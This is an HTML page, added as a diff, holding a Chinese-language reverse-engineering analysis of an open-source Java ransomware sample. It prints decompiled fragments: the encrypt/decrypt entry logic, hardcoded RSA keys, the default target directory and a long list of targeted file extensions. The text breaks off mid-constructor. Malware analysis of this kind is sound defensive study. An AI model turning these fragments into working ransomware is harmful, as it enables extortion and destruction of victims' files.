@@ -1,0 +1,1547 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>开源勒索软件JavaRansomware分析</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<style type="text/css">
+.highlight  { background: #ffffff; }
+.highlight .c { color: #999988; font-style: italic } /* Comment */
+.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
+.highlight .k { font-weight: bold } /* Keyword */
+.highlight .o { font-weight: bold } /* Operator */
+.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
+.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
+.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
+.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
+.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
+.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
+.highlight .ge { font-style: italic } /* Generic.Emph */
+.highlight .gr { color: #aa0000 } /* Generic.Error */
+.highlight .gh { color: #999999 } /* Generic.Heading */
+.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
+.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
+.highlight .go { color: #888888 } /* Generic.Output */
+.highlight .gp { color: #555555 } /* Generic.Prompt */
+.highlight .gs { font-weight: bold } /* Generic.Strong */
+.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
+.highlight .gt { color: #aa0000 } /* Generic.Traceback */
+.highlight .kc { font-weight: bold } /* Keyword.Constant */
+.highlight .kd { font-weight: bold } /* Keyword.Declaration */
+.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
+.highlight .kr { font-weight: bold } /* Keyword.Reserved */
+.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
+.highlight .m { color: #009999 } /* Literal.Number */
+.highlight .s { color: #d14 } /* Literal.String */
+.highlight .na { color: #008080 } /* Name.Attribute */
+.highlight .nb { color: #0086B3 } /* Name.Builtin */
+.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
+.highlight .no { color: #008080 } /* Name.Constant */
+.highlight .ni { color: #800080 } /* Name.Entity */
+.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
+.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
+.highlight .nn { color: #555555 } /* Name.Namespace */
+.highlight .nt { color: #000080 } /* Name.Tag */
+.highlight .nv { color: #008080 } /* Name.Variable */
+.highlight .ow { font-weight: bold } /* Operator.Word */
+.highlight .w { color: #bbbbbb } /* Text.Whitespace */
+.highlight .mf { color: #009999 } /* Literal.Number.Float */
+.highlight .mh { color: #009999 } /* Literal.Number.Hex */
+.highlight .mi { color: #009999 } /* Literal.Number.Integer */
+.highlight .mo { color: #009999 } /* Literal.Number.Oct */
+.highlight .sb { color: #d14 } /* Literal.String.Backtick */
+.highlight .sc { color: #d14 } /* Literal.String.Char */
+.highlight .sd { color: #d14 } /* Literal.String.Doc */
+.highlight .s2 { color: #d14 } /* Literal.String.Double */
+.highlight .se { color: #d14 } /* Literal.String.Escape */
+.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
+.highlight .si { color: #d14 } /* Literal.String.Interpol */
+.highlight .sx { color: #d14 } /* Literal.String.Other */
+.highlight .sr { color: #009926 } /* Literal.String.Regex */
+.highlight .s1 { color: #d14 } /* Literal.String.Single */
+.highlight .ss { color: #990073 } /* Literal.String.Symbol */
+.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
+.highlight .vc { color: #008080 } /* Name.Variable.Class */
+.highlight .vg { color: #008080 } /* Name.Variable.Global */
+.highlight .vi { color: #008080 } /* Name.Variable.Instance */
+.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
+.pl-c {
+    color: #969896;
+}
+
+.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
+    color: #0086b3;
+}
+
+.pl-e,.pl-en {
+    color: #795da3;
+}
+
+.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
+    color: #333;
+}
+
+.pl-ent {
+    color: #63a35c;
+}
+
+.pl-k,.pl-s,.pl-st {
+    color: #a71d5d;
+}
+
+.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
+    color: #df5000;
+}
+
+.pl-id {
+    color: #b52a1d;
+}
+
+.pl-ii {
+    background-color: #b52a1d;
+    color: #f8f8f8;
+}
+
+.pl-sr .pl-cce {
+    color: #63a35c;
+    font-weight: bold;
+}
+
+.pl-ml {
+    color: #693a17;
+}
+
+.pl-mh,.pl-mh .pl-en,.pl-ms {
+    color: #1d3e81;
+    font-weight: bold;
+}
+
+.pl-mq {
+    color: #008080;
+}
+
+.pl-mi {
+    color: #333;
+    font-style: italic;
+}
+
+.pl-mb {
+    color: #333;
+    font-weight: bold;
+}
+
+.pl-md,.pl-mdhf {
+    background-color: #ffecec;
+    color: #bd2c00;
+}
+
+.pl-mdht,.pl-mi1 {
+    background-color: #eaffea;
+    color: #55a532;
+}
+
+.pl-mdr {
+    color: #795da3;
+    font-weight: bold;
+}
+
+.pl-mo {
+    color: #1d3e81;
+}
+.task-list {
+padding-left:10px;
+margin-bottom:0;
+}
+
+.task-list li {
+    margin-left: 20px;
+}
+
+.task-list-item {
+list-style-type:none;
+padding-left:10px;
+}
+
+.task-list-item label {
+font-weight:400;
+}
+
+.task-list-item.enabled label {
+cursor:pointer;
+}
+
+.task-list-item+.task-list-item {
+margin-top:3px;
+}
+
+.task-list-item-checkbox {
+display:inline-block;
+margin-left:-20px;
+margin-right:3px;
+vertical-align:1px;
+}
+</style>
+</head>
+<body>
+<h1 id="-javaransomware-">开源勒索软件JavaRansomware分析</h1>
+<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
+<h2 id="0x00-">0x00 前言</h2>
+<p>这是一个Java写的勒索软件，源码托管在Github上</p>
+<ul>
+<li><a href="https://github.com/PanagiotisDrakatos/JavaRansomware">https://github.com/PanagiotisDrakatos/JavaRansomware</a></li></ul>
+<h2 id="0x01-">0x01 逆向分析</h2>
+<p>在拿到样本之后，我们使用jdgui载入</p>
+<p>找到入口main函数</p>
+<p><img src="Image/1.png" alt=""></p>
+<p>公钥和私钥，加密方式目测非对称加密或者说其中某一环节利用到了非对称加密</p>
+<pre><code>private static final String PubicKey = &quot;MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJCw1HHQooCFGsGhtxNrsdS6dDq5jtfHqqLInCj7qFlDaD/Sll5+BAUjV0GU/c+6PVyMKzmLrHh49eeGQy1ETN8CAwEAAQ==&quot;;
+private static final String PrivateKey = &quot;MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAkLDUcdCigIUawaG3E2ux1Lp0OrmO18eqosicKPuoWUNoP9KWXn4EBSNXQZT9z7o9XIwrOYuseHj154ZDLURM3wIDAQABAkA9AnLx8tkye+2GTBwYEkcPvfcYc/mpPsXSkehW15Zq3IALx3Kr5GgKGOaB2FK6PU0QzEPQbNJXdA5ZPjwTDcQBAiEA1/zINRVlrLpw2HPfqsYQ8ZSDuG2rVUUKKmKgJQXeQ98CIQCrfsw2+VKOaFoJm5BpVxIT5nsE8CXn4fr/WSFuklMXAQIgTKWnAreCKmbLTvTn5bl+H8zdZaB9kbf7YIk5XYoUky8CIQCL2ccnPYK5ZxelphrKDJtNZzMC/+OpiXtqKIE+7kycAQIgRK/DUhWUgSQV5u7VoCHDyLPCntjFMGBsg7Wi1uq+EDM=&quot;;
+</code></pre><p>这年头勒索软件要是只有对称加密还是不要出来混了</p>
+<p>入口调用本类<code>Processing()</code>方法，传入两个参数<code>toSearch</code>和<code>attack</code>，都是<code>String</code>类型，第一个参数是路径，第二个参数表示是要执行加密还是解密</p>
+<pre><code>public static void main(String[] args) throws RansomwareException
+{
+    Processing(args[0], args[1]);
+}
+</code></pre><p><code>Processing()</code>方法，通过一个分支语句判断执行的是加密还是解密</p>
+<pre><code>private static void Processing(String toSearch, String attack) throws RansomwareException
+{
+    RansomProcess p = new RansomProcess(toSearch);
+    if (attack.equalsIgnoreCase(&quot;ENCRYPT&quot;)) {
+        p.StartEncryptProcess(&quot;MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJCw1HHQooCFGsGhtxNrsdS6dDq5jtfHqqLInCj7qFlDaD/Sll5+BAUjV0GU/c+6PVyMKzmLrHh49eeGQy1ETN8CAwEAAQ==&quot;);
+    } else if (attack.equalsIgnoreCase(&quot;DECRYPT&quot;)) {
+        p.StartDecryptProcess(&quot;MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAkLDUcdCigIUawaG3E2ux1Lp0OrmO18eqosicKPuoWUNoP9KWXn4EBSNXQZT9z7o9XIwrOYuseHj154ZDLURM3wIDAQABAkA9AnLx8tkye+2GTBwYEkcPvfcYc/mpPsXSkehW15Zq3IALx3Kr5GgKGOaB2FK6PU0QzEPQbNJXdA5ZPjwTDcQBAiEA1/zINRVlrLpw2HPfqsYQ8ZSDuG2rVUUKKmKgJQXeQ98CIQCrfsw2+VKOaFoJm5BpVxIT5nsE8CXn4fr/WSFuklMXAQIgTKWnAreCKmbLTvTn5bl+H8zdZaB9kbf7YIk5XYoUky8CIQCL2ccnPYK5ZxelphrKDJtNZzMC/+OpiXtqKIE+7kycAQIgRK/DUhWUgSQV5u7VoCHDyLPCntjFMGBsg7Wi1uq+EDM=&quot;);
+    } else {
+        throw new RansomwareException(&quot;Mismatched Values Try again with correct one&quot;);
+    }
+}
+</code></pre><p>加密用公钥，解密用私钥，这里看起来很乱的样子，其实这是反编译器直接把字符串显示在函数里了，前面有这俩字符串的变量定义，所以原来的代码应该是这样写的</p>
+<pre><code>if (attack.equalsIgnoreCase(&quot;ENCRYPT&quot;)) {
+    p.StartEncryptProcess(PubicKey);
+} else if (attack.equalsIgnoreCase(&quot;DECRYPT&quot;)) {
+    p.StartDecryptProcess(PrivateKey);
+} else {
+    throw new RansomwareException(&quot;Mismatched Values Try again with correct one&quot;);
+}
+</code></pre><p>在这之前会处理传入的<code>toSearch</code>变量，这个是要加密的文件夹路径</p>
+<pre><code>RansomProcess p = new RansomProcess(toSearch);
+</code></pre><p><code>RansomProcess</code>类代码不长，都是这些<code>catch</code>的代码</p>
+<p><img src="Image/2.png" alt=""></p>
+<p>刚刚的构造方法</p>
+<pre><code>public RansomProcess(String PathtoFind)
+{
+    this.PathtoFind = PathtoFind;
+}
+</code></pre><p>同时有无参构造方法，会获取默认的路径</p>
+<pre><code>public RansomProcess()
+{
+    this.PathtoFind = getDefaultPath();
+}
+</code></pre><p>默认加密路径</p>
+<pre><code>private String getDefaultPath()
+{
+    String path = System.getProperty(&quot;user.dir&quot;);
+    return path;
+}
+</code></pre><p>再回到<code>APP</code>类，当我们的第二个参数为<code>Encrypt</code>的时候，会执行加密</p>
+<pre><code>p.StartEncryptProcess(PubicKey);
+</code></pre><p>如果是<code>Decrypt</code>，会执行解密</p>
+<pre><code>p.StartDecryptProcess(PrivateKey);
+</code></pre><p>我们先来看加密过程</p>
+<p><img src="Image/3.png" alt=""></p>
+<p>先获取加密路径下的文件列表</p>
+<pre><code>TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; containsFilters = new SearchDirectory(this.PathtoFind).GetFileMap();
+</code></pre><p>而我们打开这个类，发现出错了</p>
+<p><img src="Image/4.png" alt=""></p>
+<p>解决办法如下</p>
+<ul>
+<li><a href="http://www.wangzhixian.org/Others/Jdgui%E5%8F%8D%E7%BC%96%E8%AF%91jar%E6%96%87%E4%BB%B6%E5%87%BA%E7%8E%B0INTERNAL%20ERROR%E9%94%99%E8%AF%AF/article.html">Jdgui反编译jar文件出现INTERNAL ERROR错误</a></li></ul>
+<p>效果如下</p>
+<p><img src="Image/5.png" alt=""></p>
+<p>这个类就是获取目标路径的所有文件，然后存储在一个HashMap容器里</p>
+<p>首先是各种文件后缀</p>
+<pre><code>private static final String DOC = &quot;doc&quot;;
+    private static final String DOCX = &quot;docx&quot;;
+    private static final String LOG = &quot;log&quot;;
+    private static final String MSG = &quot;msg&quot;;
+    private static final String ODT = &quot;odt&quot;;
+    private static final String PAGES = &quot;pages&quot;;
+    private static final String RTF = &quot;rtf&quot;;
+    private static final String TEX = &quot;tex&quot;;
+    private static final String TXT = &quot;txt&quot;;
+    private static final String WPD = &quot;wpd&quot;;
+    private static final String WPS = &quot;wps&quot;;
+    private static final String HWP = &quot;hwp&quot;;
+    private static final String CSV = &quot;csv&quot;;
+    private static final String DAT = &quot;dat&quot;;
+    private static final String GBR = &quot;gbr&quot;;
+    private static final String GED = &quot;ged&quot;;
+    private static final String KEY = &quot;key&quot;;
+    private static final String KEYCHAIN = &quot;keychain&quot;;
+    private static final String PPS = &quot;pps&quot;;
+    private static final String PPT = &quot;ppt&quot;;
+    private static final String PPTX = &quot;pptx&quot;;
+    private static final String SDF = &quot;sdf&quot;;
+    private static final String TAR = &quot;tar&quot;;
+    private static final String TAX2012 = &quot;tax2012&quot;;
+    private static final String TAX2014 = &quot;tax2014&quot;;
+    private static final String VCF = &quot;vcf&quot;;
+    private static final String XML = &quot;xml&quot;;
+    private static final String ALF = &quot;alf&quot;;
+    private static final String IFF = &quot;iff&quot;;
+    private static final String M3U = &quot;m3u&quot;;
+    private static final String M4A = &quot;m4a&quot;;
+    private static final String MID = &quot;mid&quot;;
+    private static final String MP3 = &quot;mp3&quot;;
+    private static final String MPA = &quot;mpa&quot;;
+    private static final String RA = &quot;ra&quot;;
+    private static final String WAV = &quot;wav&quot;;
+    private static final String WMA = &quot;wma&quot;;
+    private static final String G32 = &quot;3g2&quot;;
+    private static final String G3P = &quot;3gp&quot;;
+    private static final String ASF = &quot;asf&quot;;
+    private static final String ASX = &quot;asx&quot;;
+    private static final String AVI = &quot;avi&quot;;
+    private static final String FLV = &quot;flv&quot;;
+    private static final String M4V = &quot;m4v&quot;;
+    private static final String MOV = &quot;mov&quot;;
+    private static final String MP4 = &quot;mp4&quot;;
+    private static final String MPG = &quot;mpg&quot;;
+    private static final String RM = &quot;rm&quot;;
+    private static final String SRT = &quot;srt&quot;;
+    private static final String SWF = &quot;swf&quot;;
+    private static final String VOB = &quot;vob&quot;;
+    private static final String WMV = &quot;wmv&quot;;
+    private static final String D3M = &quot;3dm&quot;;
+    private static final String D3S = &quot;3ds&quot;;
+    private static final String MAX = &quot;max&quot;;
+    private static final String OBJ = &quot;obj&quot;;
+    private static final String BMP = &quot;bmp&quot;;
+    private static final String DDA = &quot;dda&quot;;
+    private static final String GIF = &quot;gif&quot;;
+    private static final String JPG = &quot;jpg&quot;;
+    private static final String PNG = &quot;png&quot;;
+    private static final String PSD = &quot;psd&quot;;
+    private static final String PSIMAGE = &quot;pspimage&quot;;
+    private static final String TGA = &quot;tga&quot;;
+    private static final String THM = &quot;thm&quot;;
+    private static final String TIF = &quot;tif&quot;;
+    private static final String TIFF = &quot;tiff&quot;;
+    private static final String YUV = &quot;yuv&quot;;
+    private static final String AI = &quot;ai&quot;;
+    private static final String EPS = &quot;eps&quot;;
+    private static final String PS = &quot;ps&quot;;
+    private static final String SVG = &quot;svg&quot;;
+    private static final String INDD = &quot;indd&quot;;
+    private static final String PCT = &quot;pct&quot;;
+    private static final String PDF = &quot;pdf&quot;;
+    private static final String XLR = &quot;xlr&quot;;
+    private static final String XLS = &quot;xls&quot;;
+    private static final String XLSX = &quot;xlsx&quot;;
+    private static final String Z7 = &quot;7z&quot;;
+    private static final String RAR = &quot;rar&quot;;
+    private static final String ZIP = &quot;zip&quot;;
+    private static final String TARGZ = &quot;tar.gz&quot;;
+    private static final String APK = &quot;apk&quot;;
+    private static final String APP = &quot;app&quot;;
+    private static final String COM = &quot;com&quot;;
+    private static final String EXE = &quot;exe&quot;;
+    private static final String ASP = &quot;asp&quot;;
+    private static final String ASPX = &quot;apsx&quot;;
+    private static final String CSS = &quot;css&quot;;
+    private static final String HTM = &quot;htm&quot;;
+    private static final String HTML = &quot;html&quot;;
+    private static final String JS = &quot;js&quot;;
+    private static final String JSP = &quot;jsp&quot;;
+    private static final String PHP = &quot;php&quot;;
+    private static final String XHTML = &quot;xhtml&quot;;
+    private static final String FNT = &quot;fnt&quot;;
+    private static final String FONT = &quot;font&quot;;
+    private static final String OFT = &quot;oft&quot;;
+    private static final String TTF = &quot;ttf&quot;;
+    private static final String CRDOWNLAOD = &quot;crdownload&quot;;
+    private static final String ICS = &quot;ics&quot;;
+    private static final String MSI = &quot;msi&quot;;
+    private static final String PART = &quot;part&quot;;
+    private static final String TORRENT = &quot;torrent&quot;;
+</code></pre><p>唯独没有后缀的文件作者没有考虑</p>
+<p>然后定义了一堆HashMap，和前面的后缀名对应，键和键值暂时不清楚是什么</p>
+<pre><code>private final HashMap&lt;String, String&gt; docMap;
+private final HashMap&lt;String, String&gt; docxMap;
+private final HashMap&lt;String, String&gt; logMap;
+private final HashMap&lt;String, String&gt; msgMap;
+private final HashMap&lt;String, String&gt; odtMap;
+private final HashMap&lt;String, String&gt; pagesMap;
+private final HashMap&lt;String, String&gt; rtfMap;
+private final HashMap&lt;String, String&gt; texMap;
+private final HashMap&lt;String, String&gt; txtMap;
+private final HashMap&lt;String, String&gt; wpdMap;
+private final HashMap&lt;String, String&gt; wpsMap;
+private final HashMap&lt;String, String&gt; hwpMap;
+private final HashMap&lt;String, String&gt; csvMap;
+private final HashMap&lt;String, String&gt; datMap;
+private final HashMap&lt;String, String&gt; gbrMap;
+private final HashMap&lt;String, String&gt; gedMap;
+private final HashMap&lt;String, String&gt; keyMap;
+private final HashMap&lt;String, String&gt; keychainMap;
+private final HashMap&lt;String, String&gt; ppsMap;
+private final HashMap&lt;String, String&gt; pptMap;
+private final HashMap&lt;String, String&gt; pptxMap;
+private final HashMap&lt;String, String&gt; sdfMap;
+private final HashMap&lt;String, String&gt; tarMap;
+private final HashMap&lt;String, String&gt; tax2012Map;
+private final HashMap&lt;String, String&gt; tax2014Map;
+private final HashMap&lt;String, String&gt; vcfMap;
+private final HashMap&lt;String, String&gt; xmlMap;
+private final HashMap&lt;String, String&gt; alfMap;
+private final HashMap&lt;String, String&gt; iffMap;
+private final HashMap&lt;String, String&gt; m3uMap;
+private final HashMap&lt;String, String&gt; m4aMap;
+private final HashMap&lt;String, String&gt; midMap;
+private final HashMap&lt;String, String&gt; mp3Map;
+private final HashMap&lt;String, String&gt; mpaMap;
+private final HashMap&lt;String, String&gt; raMap;
+private final HashMap&lt;String, String&gt; wavMap;
+private final HashMap&lt;String, String&gt; wmaMap;
+private final HashMap&lt;String, String&gt; g2Map;
+private final HashMap&lt;String, String&gt; gpMap;
+private final HashMap&lt;String, String&gt; asfMap;
+private final HashMap&lt;String, String&gt; asxMap;
+private final HashMap&lt;String, String&gt; aviMap;
+private final HashMap&lt;String, String&gt; flvlvMap;
+private final HashMap&lt;String, String&gt; m4vMap;
+private final HashMap&lt;String, String&gt; movMap;
+private final HashMap&lt;String, String&gt; mp4Map;
+private final HashMap&lt;String, String&gt; mpgMap;
+private final HashMap&lt;String, String&gt; rmMap;
+private final HashMap&lt;String, String&gt; srtMap;
+private final HashMap&lt;String, String&gt; swfMap;
+private final HashMap&lt;String, String&gt; vobMap;
+private final HashMap&lt;String, String&gt; wmvMap;
+private final HashMap&lt;String, String&gt; d3mMap;
+private final HashMap&lt;String, String&gt; d3sMap;
+private final HashMap&lt;String, String&gt; maxMap;
+private final HashMap&lt;String, String&gt; objMap;
+private final HashMap&lt;String, String&gt; bmpMap;
+private final HashMap&lt;String, String&gt; ddaMap;
+private final HashMap&lt;String, String&gt; gifMap;
+private final HashMap&lt;String, String&gt; jpgMap;
+private final HashMap&lt;String, String&gt; pngMap;
+private final HashMap&lt;String, String&gt; psdMap;
+private final HashMap&lt;String, String&gt; pspimageMap;
+private final HashMap&lt;String, String&gt; tgaMap;
+private final HashMap&lt;String, String&gt; thmMap;
+private final HashMap&lt;String, String&gt; tifMap;
+private final HashMap&lt;String, String&gt; tiffMap;
+private final HashMap&lt;String, String&gt; yuvMap;
+private final HashMap&lt;String, String&gt; aiMap;
+private final HashMap&lt;String, String&gt; epsMap;
+private final HashMap&lt;String, String&gt; psMap;
+private final HashMap&lt;String, String&gt; svgMap;
+private final HashMap&lt;String, String&gt; inddMap;
+private final HashMap&lt;String, String&gt; pctMap;
+private final HashMap&lt;String, String&gt; pdfMap;
+private final HashMap&lt;String, String&gt; xlrMap;
+private final HashMap&lt;String, String&gt; xlsMap;
+private final HashMap&lt;String, String&gt; xlsxMap;
+private final HashMap&lt;String, String&gt; z7Map;
+private final HashMap&lt;String, String&gt; rarMap;
+private final HashMap&lt;String, String&gt; zipMap;
+private final HashMap&lt;String, String&gt; targzMap;
+private final HashMap&lt;String, String&gt; apkMap;
+private final HashMap&lt;String, String&gt; appMap;
+private final HashMap&lt;String, String&gt; comMap;
+private final HashMap&lt;String, String&gt; exeMap;
+private final HashMap&lt;String, String&gt; aspMap;
+private final HashMap&lt;String, String&gt; aspxMap;
+private final HashMap&lt;String, String&gt; cssMap;
+private final HashMap&lt;String, String&gt; htmMap;
+private final HashMap&lt;String, String&gt; htmlMap;
+private final HashMap&lt;String, String&gt; jsMap;
+private final HashMap&lt;String, String&gt; jspMap;
+private final HashMap&lt;String, String&gt; phpMap;
+private final HashMap&lt;String, String&gt; xhtmlMap;
+private final HashMap&lt;String, String&gt; fntMap;
+private final HashMap&lt;String, String&gt; fontMap;
+private final HashMap&lt;String, String&gt; oftMap;
+private final HashMap&lt;String, String&gt; ttfMap;
+private final HashMap&lt;String, String&gt; crdownloadMap;
+private final HashMap&lt;String, String&gt; icsMap;
+private final HashMap&lt;String, String&gt; msiMap;
+private final HashMap&lt;String, String&gt; partMap;
+private final HashMap&lt;String, String&gt; torrentMap;
+</code></pre><p>最终返回的TreeMap和传入的路径</p>
+<pre><code>private final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; containsFilters;
+private String PathtoFind;
+</code></pre><p>来看构造函数，传入路径，创建容器对象</p>
+<pre><code>public SearchDirectory(final String PathtoFind) {
+    super();
+    this.docMap = new HashMap&lt;String, String&gt;();
+    this.docxMap = new HashMap&lt;String, String&gt;();
+    this.logMap = new HashMap&lt;String, String&gt;();
+    this.msgMap = new HashMap&lt;String, String&gt;();
+    this.odtMap = new HashMap&lt;String, String&gt;();
+    this.pagesMap = new HashMap&lt;String, String&gt;();
+    this.rtfMap = new HashMap&lt;String, String&gt;();
+    this.texMap = new HashMap&lt;String, String&gt;();
+    this.txtMap = new HashMap&lt;String, String&gt;();
+    this.wpdMap = new HashMap&lt;String, String&gt;();
+    this.wpsMap = new HashMap&lt;String, String&gt;();
+    this.hwpMap = new HashMap&lt;String, String&gt;();
+    this.csvMap = new HashMap&lt;String, String&gt;();
+    this.datMap = new HashMap&lt;String, String&gt;();
+    this.gbrMap = new HashMap&lt;String, String&gt;();
+    this.gedMap = new HashMap&lt;String, String&gt;();
+    this.keyMap = new HashMap&lt;String, String&gt;();
+    this.keychainMap = new HashMap&lt;String, String&gt;();
+    this.ppsMap = new HashMap&lt;String, String&gt;();
+    this.pptMap = new HashMap&lt;String, String&gt;();
+    this.pptxMap = new HashMap&lt;String, String&gt;();
+    this.sdfMap = new HashMap&lt;String, String&gt;();
+    this.tarMap = new HashMap&lt;String, String&gt;();
+    this.tax2012Map = new HashMap&lt;String, String&gt;();
+    this.tax2014Map = new HashMap&lt;String, String&gt;();
+    this.vcfMap = new HashMap&lt;String, String&gt;();
+    this.xmlMap = new HashMap&lt;String, String&gt;();
+    this.alfMap = new HashMap&lt;String, String&gt;();
+    this.iffMap = new HashMap&lt;String, String&gt;();
+    this.m3uMap = new HashMap&lt;String, String&gt;();
+    this.m4aMap = new HashMap&lt;String, String&gt;();
